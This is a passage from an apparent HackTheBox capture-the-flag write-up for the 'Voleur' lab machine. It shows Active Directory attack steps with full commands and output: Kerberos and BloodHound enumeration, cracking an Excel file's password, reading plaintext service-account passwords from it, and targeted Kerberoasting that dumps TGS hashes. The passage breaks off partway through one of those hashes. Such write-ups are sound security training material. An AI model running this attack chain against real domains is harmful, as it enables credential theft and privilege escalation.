</span></span><span class=line><span class=cl>‚îî‚îÄ# ntpdate voleur.htb <span class=o>&amp;&amp;</span> impacket-GetADComputers <span class=s1>&#39;voleur.htb/ryan.naylor:HollowOct31Nyt&#39;</span> -dc-ip <span class=nv>$ip</span> -k -no-pass -dc-host dc.voleur.htb
</span></span><span class=line><span class=cl>2025-07-06 06:08:06.505565 <span class=o>(</span>+0200<span class=o>)</span> +28808.098908 +/- 0.010521 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span class=line><span class=cl>CLOCK: <span class=nb>time</span> stepped by 28808.098908
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Querying dc.voleur.htb <span class=k>for</span> information about domain.
</span></span><span class=line><span class=cl>SAM AcctName     DNS Hostname                         OS Version       OS                   
</span></span><span class=line><span class=cl>---------------  -----------------------------------  ---------------  --------------------
</span></span><span class=line><span class=cl>DC$              DC.voleur.htb                        10.0 <span class=o>(</span>20348<span class=o>)</span>     Windows Server <span class=m>2022</span> Standard 
</span></span></code></pre></td></tr></table></div></div><p><strong>Kerberos setting</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# ntpdate <span class=nv>$ip</span> <span class=o>&amp;&amp;</span> nxc smb  <span class=nv>$ip</span> -u ryan.naylor -p <span class=s1>&#39;HollowOct31Nyt&#39;</span> --generate-krb5-file /tmp/krb5.conf 
</span></span><span class=line><span class=cl>2025-07-06 06:02:52.274677 <span class=o>(</span>+0200<span class=o>)</span> +28828.481068 +/- 0.010524 10.129.196.199 s1 no-leap
</span></span><span class=line><span class=cl>CLOCK: <span class=nb>time</span> stepped by 28828.481068
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span>  x64 <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:voleur.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span> <span class=o>(</span>NTLM:False<span class=o>)</span>                                                                                                  
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               <span class=o>[</span>-<span class=o>]</span> voleur.htb<span class=se>\r</span>yan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED 
</span></span><span class=line><span class=cl>                                                                                                                   
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# cat /tmp/krb5.conf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>libdefaults<span class=o>]</span>
</span></span><span class=line><span class=cl>    <span class=nv>dns_lookup_kdc</span> <span class=o>=</span> <span class=nb>false</span>
</span></span><span class=line><span class=cl>    <span class=nv>dns_lookup_realm</span> <span class=o>=</span> <span class=nb>false</span>
</span></span><span class=line><span class=cl>    <span class=nv>default_realm</span> <span class=o>=</span> VOLEUR.HTB
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>realms<span class=o>]</span>
</span></span><span class=line><span class=cl>    VOLEUR.HTB <span class=o>=</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>kdc</span> <span class=o>=</span> dc.voleur.htb
</span></span><span class=line><span class=cl>        <span class=nv>admin_server</span> <span class=o>=</span> dc.voleur.htb
</span></span><span class=line><span class=cl>        <span class=nv>default_domain</span> <span class=o>=</span> voleur.htb
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>domain_realm<span class=o>]</span>
</span></span><span class=line><span class=cl>    .voleur.htb <span class=o>=</span> VOLEUR.HTB
</span></span><span class=line><span class=cl>    voleur.htb <span class=o>=</span> VOLEUR.HTB
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# <span class=nb>export</span> <span class=nv>KRB5_CONFIG</span><span class=o>=</span>/tmp/krb5.conf                              
</span></span><span class=line><span class=cl>                                                                                                                   
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# kinit ryan.naylor                
</span></span><span class=line><span class=cl>ryan.naylor@VOLEUR.HTB<span class=err>&#39;</span>s Password: 
</span></span><span class=line><span class=cl>                                                                                                                   
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# klist            
</span></span><span class=line><span class=cl>Credentials cache: FILE:/tmp/krb5cc_0
</span></span><span class=line><span class=cl>        Principal: ryan.naylor@VOLEUR.HTB
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  Issued                Expires               Principal
</span></span><span class=line><span class=cl>Jul  <span class=m>6</span> 06:04:52 <span class=m>2025</span>  Jul  <span class=m>6</span> 16:04:52 <span class=m>2025</span>  krbtgt/VOLEUR.HTB@VOLEUR.HTB
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# <span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>/tmp/krb5cc_0   
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# bloodhound-python -u ryan.naylor -d voleur.htb -dc dc.voleur.htb -c All --zip
</span></span></code></pre></td></tr></table></div></div><p>BloodHound collection represents a critical escalation in reconnaissance sophistication. By configuring Kerberos properly and obtaining a Ticket Granting Ticket (TGT) with¬†<code>kinit</code>, we established authenticated access to the domain. The¬†<code>bloodhound-python</code>¬†collector then systematically enumerated domain objects, relationships, and permissions that would be invisible to traditional scanning methods.</p><p><strong>Key Findings:</strong></p><ul><li><strong>Domain:</strong>¬†voleur.htb</li><li><strong>Users:</strong>¬†ryan.naylor, marie.bryant, lacey.miller, jeremy.combs, svc_ldap, svc_winrm, svc_backup</li><li><strong>Group:</strong>¬†First-Line Technicians (ryan.naylor is member)</li></ul><p>The discovery of multiple service accounts (svc_ldap, svc_winrm, svc_backup) immediately suggested potential privilege escalation paths, as service accounts often have elevated permissions and may be vulnerable to Kerberoasting attacks.</p><p><img alt="Ryan Naylor on Bloodhound" loading=lazy src=/images/writeups/htb/voleur/ryan.png></p><hr><h2 id=phase-2-initial-access><strong>Phase 2: Initial Access</strong><a hidden class=anchor aria-hidden=true href=#phase-2-initial-access>#</a></h2><p><strong>2.1 SMB Share Enumeration (Success with Kerberos)</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# ntpdate voleur.htb <span class=o>&amp;&amp;</span> nxc smb 10.129.196.199 -u ryan.naylor -p <span class=s1>&#39;HollowOct31Nyt&#39;</span> -d voleur.htb -k --shares
</span></span><span class=line><span class=cl>2025-07-06 06:25:00.534568 <span class=o>(</span>+0200<span class=o>)</span> -0.001658 +/- 0.013549 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span>  x64 <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:voleur.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span> <span class=o>(</span>NTLM:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               <span class=o>[</span>+<span class=o>]</span> voleur.htb<span class=se>\r</span>yan.naylor:HollowOct31Nyt 
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Enumerated shares
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               Share           Permissions     Remark
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               -----           -----------     ------
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               ADMIN$                          Remote Admin
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               C$                              Default share
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               Finance                         
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               HR                              
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               IPC$            READ            Remote IPC
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               IT              READ            
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               NETLOGON        READ            Logon server share 
</span></span><span class=line><span class=cl>SMB         10.129.196.199  <span class=m>445</span>    DC               SYSVOL          READ            Logon server share 
</span></span></code></pre></td></tr></table></div></div><p>The successful authentication using Kerberos (<code>-k</code>¬†flag) confirmed that the domain controller required Kerberos authentication for SMB access. This is a security best practice that prevents pass-the-hash attacks and ensures all authentication is properly logged and audited.</p><p><strong>Accessible Shares:</strong></p><ul><li><strong>IT (READ)</strong>¬†- Departmental share likely containing technical documentation</li><li><strong>NETLOGON (READ)</strong>¬†- Standard domain share for logon scripts</li><li><strong>SYSVOL (READ)</strong>¬†- Standard domain share for policies and scripts</li></ul><p>The IT share was particularly interesting as it suggested access to technical documentation and potentially sensitive information related to system administration.</p><p><strong>2.2 IT Share Exploration</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# ntpdate voleur.htb <span class=o>&amp;&amp;</span> impacket-smbclient -k -no-pass voleur.htb/ryan.naylor@dc.voleur.htb -target-ip 10.129.196.199
</span></span><span class=line><span class=cl>2025-07-06 06:53:36.978238 <span class=o>(</span>+0200<span class=o>)</span> +28799.386157 +/- 0.162155 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span class=line><span class=cl>CLOCK: <span class=nb>time</span> stepped by 28799.386157
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Type <span class=nb>help</span> <span class=k>for</span> list of commands
</span></span><span class=line><span class=cl><span class=c1># shares</span>
</span></span><span class=line><span class=cl>ADMIN$
</span></span><span class=line><span class=cl>C$
</span></span><span class=line><span class=cl>Finance
</span></span><span class=line><span class=cl>HR
</span></span><span class=line><span class=cl>IPC$
</span></span><span class=line><span class=cl>IT
</span></span><span class=line><span class=cl>NETLOGON
</span></span><span class=line><span class=cl>SYSVOL
</span></span><span class=line><span class=cl><span class=c1># use IT</span>
</span></span><span class=line><span class=cl><span class=c1># ls</span>
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Wed Jan <span class=m>29</span> 10:10:01 <span class=m>2025</span> .
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Mon Jun <span class=m>30</span> 23:08:33 <span class=m>2025</span> ..
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Wed Jan <span class=m>29</span> 10:40:17 <span class=m>2025</span> First-Line Support
</span></span><span class=line><span class=cl><span class=c1># cd First-Line Support</span>
</span></span><span class=line><span class=cl><span class=c1># ls</span>
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Wed Jan <span class=m>29</span> 10:40:17 <span class=m>2025</span> .
</span></span><span class=line><span class=cl>drw-rw-rw-          <span class=m>0</span>  Wed Jan <span class=m>29</span> 10:10:01 <span class=m>2025</span> ..
</span></span><span class=line><span class=cl>-rw-rw-rw-      <span class=m>16896</span>  Fri May <span class=m>30</span> 00:23:36 <span class=m>2025</span> Access_Review.xlsx
</span></span><span class=line><span class=cl><span class=c1># get Access_Review.xlsx</span>
</span></span><span class=line><span class=cl><span class=c1># exit</span>
</span></span></code></pre></td></tr></table></div></div><p>The exploration of the IT share revealed a structured organization with folders corresponding to different support tiers. The &ldquo;First-Line Support&rdquo; folder contained an Excel file named &ldquo;Access_Review.xlsx&rdquo;, which suggested periodic access reviews - a common security practice that often contains sensitive credential information.</p><p><strong>2.4 Excel File Analysis</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span> 
</span></span><span class=line><span class=cl>‚îî‚îÄ# office2john Access_Review.xlsx &gt; excel_hash.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur<span class=o>]</span> 
</span></span><span class=line><span class=cl>‚îî‚îÄ# john --wordlist<span class=o>=</span>/home/hexhunter404/Downloads/rockyou.txt excel_hash.txt 
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8 Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>Office, 2007/2010/2013 <span class=o>[</span>SHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES<span class=o>])</span> Cost <span class=m>1</span> <span class=o>(</span>MS Office version<span class=o>)</span> is <span class=m>2013</span> <span class=k>for</span> all loaded hashes 
</span></span><span class=line><span class=cl>Cost <span class=m>2</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>100000</span> <span class=k>for</span> all loaded hashes 
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status 
</span></span><span class=line><span class=cl>football1 <span class=o>(</span>Access_Review.xlsx<span class=o>)</span>
</span></span><span class=line><span class=cl>1g 0:00:00:06 DONE <span class=o>(</span>2025-07-05 23:05<span class=o>)</span> 0.1459g/s 114.4p/s 114.4c/s 114.4C/s football1..lolita Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably 
</span></span><span class=line><span class=cl>Session completed.
</span></span></code></pre></td></tr></table></div></div><p><strong>Password:</strong>¬†football1</p><p>The Excel file was password-protected with a weak password (&ldquo;football1&rdquo;), demonstrating poor security practices. This type of weak password protection is common in corporate environments where users prioritize convenience over security.</p><p><strong>Critical Information Discovered:</strong></p><ul><li><strong>svc_ldap:</strong>¬†M1XyC9pW7qT5Vn (LDAP Services)</li><li><strong>svc_iis:</strong>¬†N5pXvW1VqM7CZ8 (IIS Administration)</li><li><strong>todd.wolfe:</strong>¬†NightT1meP1dg3on14 (Account to be deleted)</li><li><strong>ryan.naylor:</strong>¬†&ldquo;Has Kerberos Pre-Auth disabled temporarily&rdquo;</li></ul><p><img alt="Excel sheet content" loading=lazy src=/images/writeups/htb/voleur/image.png></p><p>The access review spreadsheet contained a treasure trove of sensitive information, including plaintext passwords for multiple service accounts. The note about todd.wolfe&rsquo;s account being scheduled for deletion was particularly significant, as deleted accounts often retain valuable data. The notation about ryan.naylor having Kerberos Pre-Authentication disabled temporarily indicated a potential AS-REP roasting vulnerability.</p><hr><h2 id=phase-3-privilege-escalation><strong>Phase 3: Privilege Escalation</strong><a hidden class=anchor aria-hidden=true href=#phase-3-privilege-escalation>#</a></h2><p><strong>3.1 Service Account Authentication</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Test svc_ldap credentials</span>
</span></span><span class=line><span class=cl>nxc smb 10.129.196.199 -u svc_ldap -p <span class=s1>&#39;M1XyC9pW7qT5Vn&#39;</span> -d voleur.htb -k
</span></span></code></pre></td></tr></table></div></div><p>The successful authentication with the svc_ldap service account marked a significant escalation in privileges. Service accounts typically have elevated permissions within Active Directory environments, as they need to perform various automated tasks and services.</p><p><strong>3.2 BloodHound Analysis</strong></p><p><strong>Key Discovery:</strong>¬†svc_ldap has WriteSPN permission on svc_winrm</p><p><img alt=WriteSPN loading=lazy src=/images/writeups/htb/voleur/writespn.png></p><p>BloodHound analysis revealed that svc_ldap possessed WriteSPN (Write Service Principal Name) permissions on the svc_winrm account. This permission allows modification of Service Principal Names, which can be exploited to perform targeted Kerberoasting attacks. This relationship represents a classic example of how complex Active Directory permissions can create unintended privilege escalation paths.</p><p><strong>3.3 Targeted Kerberoasting (cf.</strong> <a href=https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting#targeted-kerberoasting>https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting#targeted-kerberoasting</a>)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚îå‚îÄ‚îÄ<span class=o>(</span>root„âøkali<span class=o>)</span>-<span class=o>[</span>/home/‚Ä¶/Machines/Season8/Voleur/targetedKerberoast<span class=o>]</span>
</span></span><span class=line><span class=cl>‚îî‚îÄ# ntpdate voleur.htb <span class=o>&amp;&amp;</span> ./targetedKerberoast.py -v -d voleur.htb -u svc_ldap -p <span class=s1>&#39;M1XyC9pW7qT5Vn&#39;</span> --dc-ip 10.129.196.199 --dc-host dc.voleur.htb -k
</span></span><span class=line><span class=cl>2025-07-06 07:46:00.880780 <span class=o>(</span>+0200<span class=o>)</span> +28801.753306 +/- 0.009549 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span class=line><span class=cl>CLOCK: <span class=nb>time</span> stepped by 28801.753306
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting kerberoast attacks
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Fetching usernames from Active Directory with LDAP
</span></span><span class=line><span class=cl><span class=o>[</span>VERBOSE<span class=o>]</span> SPN added successfully <span class=k>for</span> <span class=o>(</span>lacey.miller<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Printing <span class=nb>hash</span> <span class=k>for</span> <span class=o>(</span>lacey.miller<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>lacey.miller<span class=nv>$VOLEUR</span>.HTB<span class=nv>$voleur</span>.htb/lacey.miller*<span class=nv>$9</span>c71ef22710b4dbcd38d56204182f6d2<span class=nv>$8631661121</span>f089f3c4c2aea4867a92b124e862894f2c44d9274a20cb2dc216090b9abf4b2610d92db623e8f3594b7ccdfcf66efb2d7fd868451b1b7637167004cbe7fc2da9c1179dd0ca44450df6397164fb3b0ecd4ecc4bf9c1e9113f1b79de3b93a74172ce2e32103175de5830dbc90e2af9e9fa47c624e2bf69a7c61eccad388a8d4c6dfbf37115ca34974e8229fa4d71dcb9ecc0c80db4f9a834ead0907a3542740dec01c45f0da40b246a56813c304dc19e05f32de23e852c7b5fb3668c2c39f921c0a6075a7a4a43295ddbbff4854b1d9135877a718e1d6617b308359fe4ef4280d3580975f2ee4b1f2b1f3049ba73fb8c4e897e700075a8e96dfe603eb9f7dd251f69a9ad7fbe0829ffdbde587ca9cac8c902a895e093e5488796fff1797186d78b5c46ea74882045a881a8d69d2797de0d90b1780b8cb570fe3b7af418dc2fe58cd2f899623f7ee6f4f465578eb87e3b1242550125cda53a5f532f07aba674a83a420c283cdab8ca7a3e82c5d21b4d5ee1599796e88e872913337a4024eee1796f9c3e0c87c779d61eb0f169e8337fec6b38ea491b6d9e51c5f7f7f99f93795aad3e40976972599f29626bf9d3df33a0349d6dc9487bb68ba4b0340900addb6f6eb492b27c2db1285fb045922c2fc9bf2d8226c77034b04ae1951946fae3d5e2844d8f96f7affefa21b28d900f74d8e223c6dcc51cdd9bff150f94e271fa1b0bfb9d845cb37cd71ae8b0e1cc3dcacf0e89809d211146d94873527d6b6b99b5e12bfebc62839387a973800096a8886d5e12352e678655503a0e1e792cfbc5f139120dd59a10d7675d9a48eccdaa76322723cfbe7dcecd8165890ad17bad4219904df285a45dcfed917fedca4031a84580cd8da72056b9d43fb63563ebe4c9e9d79bb234f96b4230648098a6a0159aa8348f14e678a6a4301f93b0c69e77beb9d6c6a01dcdf02b6b75ba55cbb8c4fdc6717c865fcb3cbdd98b938cd52e322f4eb78a549d44f038ff73a09c82a2d680a2a2eb1a07ee2d974484072e61a5bf921356b30d999b5364b6e3881b4d4a6ab7aadaea0be836006c30f2ea77084d8b862d540227f3bc32a6a3da11ddbd2fb4f37105ac5c0ae33293a7706bdb759fdf01ff086e4262f695e86fd3c8597686e2828474400669df3a94e2dc5afa268972bc81ac7d680736d8e60f9e23757a2e12df46f3cd3a689000aca324ad0b97c2cd41a530922ecc4ff68e339ea5fb622694aec219c99ae2f4bc1c3dde7e725f5fb081d8c844fdb8da7bf9219dab333781f61d8dcb805c7483ef3eb30d0fc91c4d5d2962f907377f310d958ada60c8791ec4891eb194576658ccf03b42dc8422f2ac09e34965304fbabf7c6069f236c1ee8c14468d5ee673f6ec0a7272e7f48310e720e95582440b61202367b20c4da0ca32da9f31740f76e0eb4bd0d412738f7f
</span></span><span class=line><span class=cl><span class=o>[</span>VERBOSE<span class=o>]</span> SPN removed successfully <span class=k>for</span> <span class=o>(</span>lacey.miller<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>VERBOSE<span class=o>]</span> SPN added successfully <span class=k>for</span> <span class=o>(</span>svc_winrm<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Printing <span class=nb>hash</span> <span class=k>for</span> <span class=o>(</span>svc_winrm<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>svc_winrm<span class=nv>$VOLEUR</span>.HTB<span class=nv>$voleur</span>.htb/svc_winrm*<span class=nv>$ba33b773e1d5a82f61955402b1b03c4e$76</span>acd3c2fb0001ffdfdbbddb41ce2175310196cf81c359738b595b27e4b6aeb9a713035cc1d3f4c03d73e4fa41c75e9cdfb60bebfd07e586a1e74df4be7cb685cedad8fd28748b35f2730fd4bc65915938dde8ff8779729d7097d4ee5b8683c476b3fc79d8b84255c656a7a9fc3b9d0ee0c7eba6834d29bc4a88c48d7672df9432feae96268981c6258d51d1764861a57b19997b06e8d47b50f113c68c520c037d6559591ab0a63e18694fc22c9e3df3457d7d3e0b2cd8e285110fb48696cee4802dede3a44cd1be77230f94d2522f4d7abe418b5404a44cd27d6c22235cd30971a2fefbc9f7c2c5e1bb31e1ccfd9a70a5d8cf9db1c5e1981e0c788c5242c0e163a31c93b3f658e25c1a63968d0f1b16b0b67aec3a9fe662a8d67117cc95efc7baf68208312b3e7cf58aacae52db3cddc343737d61a2f93d7166aef05149003ed843b447156f605dff71c1d9d38fc52ff062d588914d2edb1e6daf6d60a2d31f1ed32716a2832f56b9c0422fa657cd551152546c5f57ef35a756f9eb9d9fa1cd4d6d893633f87413db436db87730d3cd18659e26511ef9bff55b90a3449ca170d53fac4d4bf7af2aceead7d3b9a57d68bdd0b8ce17883cba72dc2f995d830f58d08499e4ec79f422e0e35e76bdb73e55fdc386d65cd3aa6d0539e4d3c7aa738209aa8b2fb9fba7f15e4b109a390b7d169a47394ad9258122c0ccd60ff30b9d03a7b9125ddf77743ceddfdcdfd98f88a5a31e0e6ce817784294075c368f4410c88e8b9ea8a8293c138187346f938d853feb490291c7923d7fda729e0b2148e201ff4266ef655d262c81abb24dac81154702dbf2a86b91d1bf0917d66824c16775f6e740951cf27e3f3e2a32ae669e84eedd447c4a3c8795ff835ae5d86d61d8bb16480751ffe869e37af4e06aea6f220de0aae54f775da903a6bd70b022a3a6360d8858de45e4110735d823153daf54a6652c71b1f9e0a1185bf4266d2016719d45de57bcd5d56942774848fbe58a4ca3d08c36c6782de9233aee865dc367439ead0d6d7e969b703151ffe8062055d0df4ae38e648d4c750f2e37f98bf86f4e8f33bb214cc7650c6e140fcaa9d6eb28a4015f404ff6186eae9d5bf0750d5576344e037c541eaad33b990f4c2b89f2a144a8b5953eb46d29760f7d3586e8be1b4d40b1ab44cab60675370a3b1d4000f7ba5c702244577abc63955b6279135578a4b8b319d91b8836efcd56c51cee39efaede7f90f63d0f9df8e340047fae229947ec206ecd606bf595544524261a34d50047c4947b293fb2d040f272b5fc0af01bfed543c95a8d68c1e6333ea485b44e474df491a19653ea7eb8464d73b6fdcbce1107f2cc523fa866107e083e28cddd42f38775308190c625e77fa83a437c0ed9fab68586ab66d37816cb7a7b38532f868be88e8eb5e46241db403de30ed9bb96
